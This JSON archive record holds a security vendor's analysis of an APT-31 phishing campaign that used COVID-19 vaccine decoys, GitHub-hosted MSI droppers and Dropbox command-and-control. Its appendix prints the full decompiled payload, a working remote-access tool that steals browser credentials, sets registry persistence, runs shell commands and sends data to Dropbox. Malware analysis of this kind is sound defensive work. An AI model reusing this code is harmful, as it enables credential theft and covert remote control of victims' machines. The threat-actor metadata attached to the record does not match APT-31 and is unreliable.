{
    "id": "1ad10528-f32f-4859-8922-fc0523e20452",
    "created_at": "2023-01-12T14:59:08.307997Z",
    "updated_at": "2025-03-27T02:16:44.344569Z",
    "deleted_at": null,
    "sha1_hash": "426d64ad09acb97d491d45c4403776c405b9dd3d",
    "title": "2020-10-27 - APT-31 leverages COVID-19 vaccine theme and abuses legitimate online services",
    "authors": "",
    "file_creation_date": "2022-05-28T19:35:08Z",
    "file_modification_date": "2022-05-28T19:35:08Z",
    "file_size": 2849987,
    "plain_text": "# APT-31 Leverages COVID-19 Vaccine Theme\n\n**[zscaler.com/blogs/research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online-services](https://www.zscaler.com/blogs/research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online-services)**\n\nRecently, Zscaler's ThreatLabZ team discovered several malicious MSI installer binaries that were\nhosted on attacker-controlled GitHub accounts and distributed in-the-wild in August 2020. These MSI\nbinaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social\nengineering technique.\n\nAfter further analysis of these MSI binaries, we gathered sufficient intel from the code base and attack\nflow to correlate it to the Chinese state-sponsored threat actor APT 31. In this blog, we will share\ndetails of the attack flow, threat attribution, correlation between various instances of attacks by this\nthreat actor, and an in-depth technical analysis of the payloads involved. We will conclude our analysis\nby sharing indicators of compromise (IOCs), useful metadata, and the complete decompiled Python\nscript, which was the main payload involved in these attacks.\n\n### Distribution strategy\n\nThe threat actor in this case leverages legitimate online services end-to-end in the infection chain in\norder to blend in with benign traffic and evade network security controls.\n\nThe infection chain starts with an email in which the victim receives a download link that fetches the\nfirst-stage downloader. As we found in our analysis, this first-stage downloader is responsible for\nfetching a malicious MSI file hosted on an attacker-controlled GitHub page. This MSI file is\ndownloaded and executed on the endpoint. As a result, a malicious Python-compiled binary is dropped\non the file system, which uses the Dropbox API for command-and-control (C&C) communication.\nBased on the metadata of the dropped binary, we observed that attackers were spoofing legitimate\napplication names related to popular online services such as Microsoft OneDrive.\n\nWhile we did not obtain the first-stage downloader for this attack, we were able to reconstruct the\nattack flow based on the tactics, techniques, and procedures (TTPs) used by this threat actor in the\npast with a similar attack flow.\n\n\n-----\n\nFigure 1 shows the entire reconstructed attack flow.\n\n_Figure 1: Reconstructed entire attack flow_\n\nTo make the attack more convincing, attackers leveraged a social engineering technique by displaying\ndecoy content to the user. This decoy content, as we describe in the later sections of the blog, is\nrelated to themes of interest for the targeted victims.\n\n### Threat attribution\n\nWe correlated all the instances of attacks described in this blog to the same threat actor based on the\nfollowing indicators.\n\nThe attack flow is similar in all cases.\nThe use of legitimate attacker-controlled GitHub accounts to host malicious MSI files with\nspoofed file extensions.\nThe use of Dropbox API for command-and-control (C&C) communication.\nThe MSI wrapper used to convert the EXE to MSI file format.\nPyInstaller used to compile the Python script to the final payload.\nDecompiled Python script using the same AES encryption key and sharing of code base.\nThe name of artifacts such as Windows Run registry key used to create persistence on the\nmachine.\n\nIn October 2020, Google’s Threat Analysis Group (TAG) attributed an attack using a similar payload to\n[APT-31 in its report here. While Google’s report did not share any technical analysis details for the](https://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats)\npayload, we were able to correlate the codebase to the Python-compiled binary highlighted by them.\n\n\n-----\n\nAll the indicators mentioned above were shared by the samples in our report.\n\n[Upon further research, we discovered a report of an attack using Hong Kong pro-democracy protest](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/)\nthemes in October 2019. There is considerable overlap between the malware distribution strategy and\nthe payload indicators in this report and the samples we discovered.\n\nTherefore, we can confidently attribute the attack discussed in this blog to APT-31.\n\n### Decoy contents\n\nIn this section, we share details of the decoy documents that were displayed to the user as a social\nengineering technique as the malicious payload executed in the background.\n\n**MD5 hash of MSI file: 077ebc3535b38742307ef1c9e3f95222**\n\n**Decoy Filename: PAPER-COVID-19-Vaccine-Strategy.pdf**\n\nFigure 2 shows the contents of this decoy document, which discusses a COVID-19 vaccine strategy\nspecifically for New Zealand government authorities. Threat actors obtained the original source of this\ndocument [here.](https://covid19.govt.nz/)\n\n_Figure 2: Decoy document related to the New Zealand government's COVID-19 vaccine strategy_\n\n**MD5 hash of MSI file: f3896d4a29b4a2ea14ea8a7e2e500ee5**\n\n**Decoy Filename: covid_19_vaccines_final.pdf**\n\n\n-----\n\nFigure 3 shows the contents of this document, which describes various initiatives related to COVID-19\nvaccines. It pretends to be from the “Treatment Action Group.”\n\n_Figure 3: Contents of the decoy document (from \"Treatment Action Group\")._\n\n**MD5 hash of MSI file: b4112b0700be2343422c759f5dc7bb8b**\n\n**Decoy Filename: FINAL__-COVID-Vaccine-Letter.pdf**\n\nFigure 4 shows the contents of a document that pretends to be from the National Indian Health Board\nand discusses the COVID-19 vaccine distribution with a focus on pandemic relief packages.\n\n\n-----\n\n_Figure 4: Contents of vaccine distribution document which pretends to be from the National Indian_\n_Health Board._\n\n**MD5 hash of MSI file: daa7045a5c607fc2ae6fe0804d493cea**\n\n**Decoy filename: 200709-The-Publics-Role-in-COVID-19-Vaccination.pdf**\n\nFigure 5 shows the contents of a document that pretends to be from a working group involving John\nHopkins Bloomberg School of Public Health and Texas State Anthropology discussing the public’s role\nin the COVID-19 vaccination.\n\n\n-----\n\n_Figure 5: Decoy document related to the public's role in a COVID-19 vaccination_\n\n### Technical analysis\n\n\n-----\n\nSince there are multiple stages involved in the infection chain, we will describe each component in\ndetail in this section.\n\n### MSI file\n\nFor the purpose of technical analysis, we will consider the MSI file with MD5 hash:\n**f3896d4a29b4a2ea14ea8a7e2e500ee5**\n\nMSI is an installer package file format used by Microsoft Windows. Microsoft Windows provides an\n_msiexec utility that provides the means to install, modify, and perform operations on MSI files._\n\nThe threat actor in this case hosted the MSI file on GitHub using a spoofed file extension to look like a\nPDF. Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor\n[from previous tactics, techniques, and procedures (TTPs) in the report, we concluded that there was a](https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/)\nfirst-stage payload involved that was used to fetch the MSI file from GitHub and execute it using the\nmsiexec.exe command-line utility.\n\nIn this threat actor's 2019 activity, an LNK file was used to fetch the MSI binary from GitHub and\nexecute it using the following command line:\n\n_C:\\Windows\\System32\\msiexec.exe /q /i <github_URL>_\n\nIt is worth noting that in 2019, this actor used a fake file extension (*.png) for the MSI binary hosted on\nthe attacker-controlled GitHub account.\n\nBased on this similarity, we are confident that a first-stage payload was involved that downloads and\nexecutes the MSI files.\n\n[All the MSI files were created using MSI Wrapper software, which helps to convert an executable file](https://www.exemsi.com/)\nto an MSI file. With an MSI Wrapper, you can include other files in the same MSI package and execute\nthem along with the main executable.\n\nFigure 6 shows the MSI Wrapper flash screen displayed to the user upon execution.\n\n_Figure 6: MSI Wrapper flash screen displayed to the user._\n\n\n-----\n\nUpon execution, the MSI binary drops and executes the main payload, which is a python-compiled\nbinary and also opens the dropped decoy PDF file which is displayed to the user.\n\n### Python-compiled binary\n\nThe MSI file described above will drop a Python-compiled binary in the Appdata\\Roaming directory,\nwhich is used to perform further malicious activities.\n\n**MD5 hash: bd26122b29ece6ce5abafb593ff7b096**\n\n**Filename: OneDrive.exe**\n\nFor the purpose of social engineering, the threat actor chose file names related to legitimate online\nservices, including Microsoft OneDrive. In a few instances, we observed the use of file names\nresembling McAfee’s endpoint security product. Even the file icons for these binaries are selected to\nmasquerade as the corresponding legitimate applications.\n\nSince this binary used the PyInstaller packager to compile the Python script to a standalone\nexecutable, we can extract the compiled Python script (*.pyc) from this package and use a\ndecompiling tool such as uncomplye6 to decompile its contents.\n\nThe complete decompiled script is included in Appendix I.\n\nBelow are some of the key functionalities of the binary.\n\n**1. Check and use the proxy configuration: Check if the proxy is configured using registry value**\n“ProxyEnable” which is located under registry key\n“Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings”. If successful then the proxy server\ninformation is obtained using the registry value “ProxyServer” under the same registry key. Later this\nproxy server is used for all the C&C communication.\n\n**2. Browser credential stealing: Capability to steal credentials (username and password) from the**\ninstalled browsers, Microsoft Internet Explorer (MSIE), and Google Chrome browser.\n\nFigures 7 and 8 show the code sections responsible for stealing the credentials from MSIE and\nChrome browser respectively.\n\n\n-----\n\n_Figure 7: Code section used to steal MSIE credentials._\n\n_Figure 8: Code section used to steal Chrome browser credentials._\n\n**3. Persistence: Creates a Windows RUN registry key for persistence. The name of the key is:**\n\"Dropbox Update Setup\". This name was consistent in all the samples. This key points to the location\nof the Python-compiled binary in the %appdata% directory to ensure that it is started automatically\neach time the system is rebooted.\n\n4. Bot identifier generation: Generates a unique ID (uuid) for the machine, which is used to register\nthe bot with the attacker's C&C server.\n\nuniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))\n\n5. Registration of bot: Collects the following information from the machine to register the bot with the\nC&C server.\n\n\n-----\n\nSystem information - Details of processor architecture.\n\nCurrent timestamp - Format: %Y-%m-%d %H:%M:%S\n\nSystem name\n\nUsername of the machine\n\nCollects this information in JSON format, AES encrypts it and sends it to the attacker's server using\nDropbox API.\n\n6. Command-and-control activities: After registering the bot with attacker's server, it will check for\nnew jobs by querying the Dropbox API endpoint: https://api.dropboxapi.com/2/files/job\n\nThere are three main commands supported in the script:\n\na) upload\n\nb) download\n\nc) cmd: A system command which needs to be executed on the endpoint. Python script will execute\nthis using subprocess.Popen()\n\nThe results will be stored in a JSON format, AES-encrypted and sent as an attachment using the\nDropbox API.\n\nJSON format: {u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user':\ngetUser(), u'file': self.attachment, u'msg': self.text}\n\nHere, text indicates the output of the command executed on the endpoint.\n\nThe filename format used is: back#<unique_id>#<job_id>#.txt\n\n### Zscaler Cloud Sandbox detection\n\nFigure 9 shows the sandbox detection for the final payload which is a Python-compiled binary.\n\n\n-----\n\n_Figure 9: Zscaler Cloud Sandbox detection._\n\n### Conclusion\n\nThe threat actor, APT-31, quickly leverages current themes, such as COVID-19, or political themes of\ninterest to the victim as a social engineering technique to infect their machines. By abusing legitimate\nservices such as GitHub, Google Drive, and Dropbox in the infection chain, end-to-end, this threat\nactor manages to evade network security solutions.\n\nAs always, users should be cautious when receiving emails out of the blue, even if those emails\nappear to be related to something you are interested in, such as information about a COVID-19\nvaccine.\n\nThe Zscaler ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep\nour customers safe.\n\n### MITRE ATT&CK table\n\n**ID** **Tactic** **Technique**\n\nT1566.002 Spearphishing Link Email body contains link to attacker hosted file\n\nT1204.002 User Execution: Malicious File User downloads and open the attacker hosted file\n\nT1059.003 Windows command shell Executes the commands fetched from C2\n\n\nT1140 Deobfuscate/Decode Files or\nInformation\n\n\nStrings and other data are obfuscated in the\npayload\n\n\n-----\n\nT1547.001 Registry Run Keys/Startup\nFolder\n\n\nCreate Run registry key for persistence\n\n\nT1555.003 Credentials from Web Browsers Steals credentials from Explorer and Chrome\nbrowser\n\nT1082 System Information Discovery Sends processor architecture and computer name\n\nT1083 File and Directory Discovery Upload file from the victim machine\n\nT1033 System Owner/User Discovery Sends the username of the current logged in user\n\nT1124 System Time Discovery Sends the system current time\n\nT1005 Data from Local System Upload file from victim machine\n\nT1132.001 Standard Encoding Uses AES encryption for c2 communication\n\nT1090.001 Internal Proxy Uses user configured proxy information from\nregistry if available\n\nT1567.002 Exfiltration to Cloud Storage Data is uploaded to dropbox via api\n\n## Indicators of Compromise\n\n**Host-based indicators:**\n\n**MD5 Hashes of MSI files**\n\n077ebc3535b38742307ef1c9e3f95222\n\nf3896d4a29b4a2ea14ea8a7e2e500ee5\n\nb4112b0700be2343422c759f5dc7bb8b\n\ndaa7045a5c607fc2ae6fe0804d493cea\n\n3347a1409f0236904beaceba2c8c7d56\n\n**MD5 Hashes of Python-compiled binaries**\n\nbd26122b29ece6ce5abafb593ff7b096\n\nfc4995e931f0ff717fe6a6189f07af64\n\n**Dropped Python-compiled binary file names**\n\n\n-----\n\nOneDrive.exe\n\nsiHostx64.exe\n\n**Dropped decoy file names**\n\nmcafee_trial_setup_433.0207.3919_key.exe\n\nPAPER-COVID-19-Vaccine-Strategy.pdf\n\ncovid_19_vaccines_final.pdf\n\nFINAL__-COVID-Vaccine-Letter.pdf\n\n200709-The-Publics-Role-in-COVID-19-Vaccination.pdf\n\n**LNK file metadata analysis**\n\n**# This LNK was used by the threat actor in 2019**\n\n**LNK file MD5 hash: 817837e0609b5bdade503428dd17514e**\n\n# LNK file was generated inside a VMWare virtual machine by the attacker\n\n# These details were extracted from the LNK file using the LECmd tool.\n\nTracker database block\n\n**Machine ID: desktop-fe0haua**\n\n**MAC Address: 00:0c:29:51:de:79**\n\n**MAC Vendor: VMWARE**\n\nCreation: 2019-10-29 02:05:30\n\n**Network-based indicators**\n\n**Github URL hosting MSI file:**\n\nhxxps://github.com/yandexmcf1/rnicrosoft/raw/974aaa531eeb301762e486c3a120103f09a3b194/PAPERCOVID-19-Vaccine-Strategy.pdf\n\nhxxps://raw.githubusercontent.com/protonshshll/run/master/siHost64.png\n\n**Attacker-controlled Github account names:**\n\nyandexmcf1\n\nprotonshshll\n\n### References\n\nhttps://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats\n\n\n-----\n\nhttps://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/\n\n**Appendix 1**\n\n**Python decompiled code**\n\n# The decompiled Python code is consistent among all the samples. The only change we observed\nwas in the access token. Even the AES encryption key is shared between all the samples.\n\nimport requests, json, win32cred, sqlite3, win32crypt, subprocess, sys, os, threading, time, platform,\nuuid, base64, time\n\nfrom Crypto import Random\n\nfrom Crypto.Cipher import AES\n\nfrom _winreg import *\n\ntime.sleep(480)\n\naccess_token = 'XAdmrYKoIiAAAAAAAAAADSEB3W3JCY6-pc1tD0zTp2upliDsO9vNrjfjIDJae_Ii'\n\napi_url = 'https://api.dropboxapi.com/2/files/'\n\ncontent_url = 'https://content.dropboxapi.com/2/files/'\n\nrespath = '/res'\n\njobpath = '/job'\n\nrespath_s = '/res/'\n\njobpath_s = '/job/'\n\nproxies = {}\n\nuniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))\n\nBS = 16\n\npad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)\n\nunpad = lambda s: s[0:-ord(s[(-1)])]\n\nclass AESCipher:\n\ndef __init__(self):\n\nself.key = 'ApmcJue1570368JnxBdGetr*^#ajLsOw'\n\ndef encrypt(self, raw):\n\nraw = pad(raw)\n\n\n-----\n\niv = Random.new().read(AES.block_size)\n\ncipher = AES.new(self.key, AES.MODE_CBC, iv)\n\nreturn base64.b64encode(iv + cipher.encrypt(raw))\n\ndef decrypt(self, enc):\n\nenc = base64.b64decode(enc)\n\niv = enc[:16]\n\ncipher = AES.new(self.key, AES.MODE_CBC, iv)\n\nreturn unpad(cipher.decrypt(enc[16:]))\n\naesciper = AESCipher()\n\nclass regthread(threading.Thread):\n\ndef __init__(self):\n\nthreading.Thread.__init__(self)\n\nself.tempdir = os.getenv('AppData')\n\nself.fileName = sys.argv[0]\n\nself.regpath = os.path.join(self.tempdir, os.path.basename(self.fileName))\n\nself.runs = 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\n\nself.services = 'Dropbox Update Setup'\n\nself.daemon = False\n\nself.start()\n\ndef run(self):\n\nos.popen('copy %s %s /y' % (self.fileName, self.tempdir))\n\nkey = OpenKey(HKEY_CURRENT_USER, self.runs)\n\nwhile True:\n\nrunkey = []\n\ntry:\n\ni = 0\n\nwhile True:\n\n\n-----\n\nsubkey = EnumValue(key, i)\n\nrunkey.append(subkey[0])\n\ni += 1\n\nexcept Exception as e:\n\npass\n\nif self.services not in runkey:\n\ntime.sleep(10)\n\ntry:\n\nkey = OpenKey(HKEY_CURRENT_USER, self.runs, 0, KEY_ALL_ACCESS)\n\nSetValueEx(key, self.services, 0, REG_SZ, self.regpath)\n\nkey.Close()\n\nexcept Exception as e:\n\npass\n\ntime.sleep(10)\n\ndef get_proxyserver():\n\ntry:\n\naReg = ConnectRegistry(None, HKEY_CURRENT_USER)\n\naKey = OpenKey(aReg, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings')\n\nsubCount, valueCount, lastModified = QueryInfoKey(aKey)\n\nfor i in range(valueCount):\n\nn, v, t = EnumValue(aKey, i)\n\nif n == 'ProxyServer':\n\nif ';' in v:\n\nslist = v.split(';')\n\nfor i in slist:\n\nif 'http=' in i:\n\nserver = i.split('=')[1]\n\n\n-----\n\nelse:\n\nserver = ''\n\nelif '=' in v:\n\nserver = v.split('=')[1]\n\nelse:\n\nserver = v\n\nCloseKey(aKey)\n\nreturn server\n\nexcept Exception as e:\n\nreturn ''\n\nreturn\n\ndef check_proxy():\n\ntry:\n\naReg = ConnectRegistry(None, HKEY_CURRENT_USER)\n\naKey = OpenKey(aReg, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings')\n\nsubCount, valueCount, lastModified = QueryInfoKey(aKey)\n\nfor i in range(valueCount):\n\nn, v, t = EnumValue(aKey, i)\n\nif n == 'ProxyEnable':\n\nisproxy = v\n\nCloseKey(aKey)\n\nreturn isproxy\n\nexcept Exception as e:\n\nreturn 0\n\nreturn\n\ndef get_ie_creds(server):\n\nproxycreds = []\n\n\n-----\n\nif : in server:\n\nserver = server.split(':')[0]\n\ntry:\n\ncreds = win32cred.CredEnumerate(None, 1)\n\nfor i in creds:\n\nif server in i['TargetName']:\n\nuser = i['UserName']\n\npasswd = i['CredentialBlob'].replace('\\x00', '')\n\ndic = {user: passwd}\n\nproxycreds.append(dic)\n\nreturn proxycreds\n\nexcept Exception as e:\n\nreturn proxycreds\n\nreturn\n\ndef get_chrome_creds(server):\n\npath = os.getenv('APPDATA') + '\\\\..\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'\n\ncreds = []\n\nif ':' in server:\n\nserver = server.split(':')[0]\n\ntry:\n\nconn = sqlite3.connect(path)\n\ncursor = conn.cursor()\n\ncursor.execute('SELECT action_url, username_value, password_value FROM logins')\n\ndata = cursor.fetchall()\n\nif len(data) > 0:\n\nfor result in data:\n\nif result[0] == server:\n\n\n-----\n\npassword = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]\n\nif password:\n\ndic = {result[1]: password}\n\ncreds.append(dic)\n\nreturn creds\n\nexcept Exception as e:\n\nreturn creds\n\nreturn\n\ndef check_cred(server, creds):\n\nglobal proxies\n\npro = {}\n\nurl = 'https://www.dropbox.com'\n\nif server:\n\nif creds:\n\nfor userdic in creds:\n\nfor user in userdic:\n\npro['http'] = 'http://' + user + ':' + userdic[user] + '@' + server\n\npro['https'] = 'https://' + user + ':' + userdic[user] + '@' + server\n\nr = requests.get(url, proxies=pro)\n\nif r.status_code == 200:\n\nproxies = pro\n\nreturn 1\n\nelse:\n\npro['http'] = 'http://' + server\n\npro['https'] = 'https://' + server\n\nr = requests.get(url, proxies=pro)\n\nif r.status_code == 200:\n\n\n-----\n\nproxies = pro\n\nreturn 1\n\nreturn 0\n\ndef do_post(url, headers, data, proxy):\n\nif proxy:\n\nr = requests.post(url, headers=headers, data=data, proxies=proxies)\n\nif 'download' in url:\n\nreturn r.content\n\nif 'upload' in url:\n\nreturn r.content\n\nreturn json.loads(r.content)\n\nelse:\n\nr = requests.post(url, headers=headers, data=data)\n\nif 'download' in url:\n\nreturn r.content\n\nif 'upload' in url:\n\nreturn r.content\n\nreturn json.loads(r.content)\n\ndef search(path, query, proxy):\n\nheaders = {'Authorization': 'Bearer ' + access_token,\n\n'Content-Type': 'application/json'}\n\ndata = {'path': path,\n\n'query': query,\n\n'mode': {'.tag': 'filename'}}\n\nr = do_post(api_url + 'search', headers, json.dumps(data), proxy)\n\nreturn r\n\ndef download(filepath, proxy):\n\n\n-----\n\nheaders = { Authorization : Bearer + access_token,\n\n'Dropbox-API-Arg': '{\"path\":\"%s\"}' % filepath}\n\nr = do_post(content_url + 'download', headers, '', proxy)\n\nreturn r\n\ndef upload(data, filepath, proxy):\n\nheaders = {'Authorization': 'Bearer ' + access_token,\n\n'Content-Type': 'application/octet-stream',\n\n'Dropbox-API-Arg': '{\"path\":\"%s\"}' % filepath}\n\nr = do_post(content_url + 'upload', headers, data, proxy)\n\nreturn r\n\ndef delete(filepath, proxy):\n\nheaders = {'Authorization': 'Bearer XAdmrYKoIiAAAAAAAAAADSEB3W3JCY6pc1tD0zTp2upliDsO9vNrjfjIDJae_Ii',\n\n'Content-Type': 'application/json'}\n\ndata = {'path': filepath}\n\nr = do_post(api_url + 'delete', headers, json.dumps(data), proxy)\n\nreturn r\n\nclass Download(threading.Thread):\n\ndef __init__(self, jobid, filepath, proxy):\n\nthreading.Thread.__init__(self)\n\nself.jobid = jobid\n\nself.filepath = filepath\n\nself.daemon = True\n\nself.proxy = proxy\n\nself.start()\n\ndef run(self):\n\ntry:\n\nif os.path.exists(self.filepath) is True:\n\n\n-----\n\nSendmsg({u cmd : u download, u res : u Download file success... }, self.proxy, self.jobid,\nself.filepath)\n\nelse:\n\nSendmsg({u'cmd': u'download', u'res': u'Path to file invalid'}, self.proxy, self.jobid)\n\nexcept Exception as e:\n\nSendmsg({u'cmd': u'download', u'res': (u'Failed: {}').format(e)}, self.proxy, self.jobid)\n\nclass Upload(threading.Thread):\n\ndef __init__(self, jobid, dest, attachment, proxy):\n\nthreading.Thread.__init__(self)\n\nself.jobid = jobid\n\nself.dest = dest\n\nself.attachment = attachment\n\nself.daemon = True\n\nself.proxy = proxy\n\nself.start()\n\ndef run(self):\n\ntry:\n\nfile_content = download(jobpath_s + self.attachment, self.proxy)\n\nfopen = open(self.dest, 'wb+')\n\nfopen.write(file_content)\n\nfopen.close()\n\nSendmsg({u'cmd': u'upload', u'res': u'Upload file success,saved to %s' % self.dest}, self.proxy,\nself.jobid)\n\nexcept Exception as e:\n\nSendmsg({u'cmd': u'upload', u'res': (u'Upload file Failed: {}').format(e)}, self.proxy, self.jobid)\n\nclass execCmd(threading.Thread):\n\ndef __init__(self, command, jobid, proxy):\n\nthreading.Thread.__init__(self)\n\n\n-----\n\nself.command = command\n\nself.jobid = jobid\n\nself.daemon = True\n\nself.proxy = proxy\n\nself.start()\n\ndef run(self):\n\ntry:\n\nproc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE,\nstderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\nstdout_value = unicode(proc.stdout.read(), errors='ignore')\n\nstdout_value += unicode(proc.stderr.read(), errors='ignore')\n\nSendmsg({'cmd': self.command, 'res': stdout_value}, self.proxy, jobid=self.jobid)\n\nexcept Exception as e:\n\npass\n\ndef getdate():\n\nreturn time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))\n\ndef getUser():\n\nreturn os.environ.get('USERNAME')\n\ndef getComputername():\n\nreturn os.environ.get('COMPUTERNAME')\n\ndef getSysinfo():\n\nreturn ('{}-{}').format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])\n\ndef uploadfiles(filename, proxy):\n\ntry:\n\nif search(respath, os.path.basename(filename), proxy)['matches']:\n\ndelete(respath_s + os.path.basename(filename), proxy)\n\nfopen = open(filename, 'rb').read()\n\nupload(fopen, respath_s + os.path.basename(filename), proxy)\n\n\n-----\n\nexcept Exception as e:\n\npass\n\ndef msgparse(path, proxy):\n\ntry:\n\nmsg = download(path, proxy)\n\nreturn json.loads(aesciper.decrypt(msg))\n\nexcept Exception as e:\n\nreturn False\n\nclass Sendmsg(threading.Thread):\n\ndef __init__(self, text, proxy, jobid='', attachment=''):\n\nthreading.Thread.__init__(self)\n\nself.text = text\n\nself.jobid = jobid\n\nself.attachment = attachment\n\nself.proxy = proxy\n\nself.daemon = True\n\nself.start()\n\ndef run(self):\n\nfilename = uniqueid\n\nfilename = (u'back#{}#{}#.txt').format(uniqueid, self.jobid)\n\nfile_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname':\ngetComputername(), u'user': getUser(), u'file': self.attachment, u'msg': self.text})\n\nif self.attachment:\n\nif os.path.exists(self.attachment) == True:\n\nfile_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname':\ngetComputername(), u'user': getUser(), u'file': os.path.basename(self.attachment), u'msg': self.text})\n\nuploadfiles(self.attachment, self.proxy)\n\nwhile True:\n\n\n-----\n\ntry:\n\nif search(respath, filename, self.proxy)['matches']:\n\ndelete(respath_s + filename, self.proxy)\n\nupload(aesciper.encrypt(file_content), respath_s + filename, self.proxy)\n\nbreak\n\nexcept Exception as e:\n\ntime.sleep(10)\n\ndef checkJobs(proxy):\n\nwhile True:\n\ntry:\n\njoblist = search(jobpath, uniqueid, proxy)\n\nfor job in joblist['matches']:\n\nmsg = msgparse(job['metadata']['path_lower'], proxy)\n\njobid = job['metadata']['path_lower'].split('#')[2]\n\nif msg:\n\ncmd = msg['cmd']\n\narg = msg['arg']\n\nif cmd == 'download':\n\nDownload(jobid, arg, proxy)\n\nelif cmd == 'upload':\n\nUpload(jobid, arg, msg['file'], proxy)\n\nelif cmd == 'cmd':\n\nexecCmd(arg, jobid, proxy)\n\ntry:\n\ndelete(job['metadata']['path_lower'], proxy)\n\nexcept Exception as e:\n\npass\n\n\n-----\n\ntime.sleep(10)\n\nexcept Exception as e:\n\ntime.sleep(10)\n\ndef call_online(proxy):\n\ninfo = {u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser()}\n\nfilename = ('online#{}#.txt').format(uniqueid)\n\nfile_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(),\nu'user': getUser(), u'msg': info})\n\nwhile True:\n\ntry:\n\nif search(respath, filename, proxy)['matches']:\n\ndelete(respath_s + filename, proxy)\n\nupload(aesciper.encrypt(file_content), respath_s + filename, proxy)\n\nbreak\n\nexcept Exception as e:\n\ntime.sleep(10)\n\ndef startbot(proxy):\n\nregthread()\n\ncall_online(proxy)\n\ntry:\n\ncheckJobs(proxy)\n\nexcept Exception as e:\n\npass\n\nif __name__ == '__main__':\n\nisproxy = check_proxy()\n\nif isproxy:\n\ntry:\n\nserver = get_proxyserver()\n\n\n-----\n\nie_creds = get_ie_creds(server)\n\nif ie_creds:\n\nflag = check_cred(server, ie_creds)\n\nif flag:\n\nstartbot(isproxy)\n\nelse:\n\nstartbot(not isproxy)\n\nelse:\n\nchrome_creds = get_ie_creds(server)\n\nif chrome_creds:\n\nflag = check_cred(server, chrome_creds)\n\nif flag:\n\nstartbot(isproxy)\n\nelse:\n\nstartbot(not isproxy)\n\nelse:\n\nflag = check_cred(server, [])\n\nif flag:\n\nstartbot(isproxy)\n\nelse:\n\nstartbot(not isproxy)\n\nexcept Exception as e:\n\nstartbot(0)\n\nelse:\n\nstartbot(isproxy)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-27 - APT-31 leverages COVID-19 vaccine theme and abuses legitimate online services.pdf"
    ],
    "report_names": [
        "2020-10-27 - APT-31 leverages COVID-19 vaccine theme and abuses legitimate online services.pdf"
    ],
    "threat_actors": [
        {
            "id": "8670f370-1865-4264-9a1b-0dfe7617c329",
            "created_at": "2022-10-25T16:07:23.69953Z",
            "updated_at": "2025-03-27T02:02:09.929725Z",
            "deleted_at": null,
            "main_name": "Hades",
            "aliases": [
                "Operation TrickyMouse"
            ],
            "source_name": "ETDA:Hades",
            "tools": [
                "Brave Prince",
                "Gold Dragon",
                "GoldDragon",
                "Lovexxx",
                "Olympic Destroyer",
                "Running RAT",
                "RunningRAT",
                "SOURGRAPE",
                "running_rat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d706edf6-cb86-4611-99e1-4b464e9dc5b9",
            "created_at": "2023-01-06T13:46:38.839083Z",
            "updated_at": "2025-03-27T02:00:02.93205Z",
            "deleted_at": null,
            "main_name": "INDRIK SPIDER",
            "aliases": [],
            "source_name": "MISPGALAXY:INDRIK SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
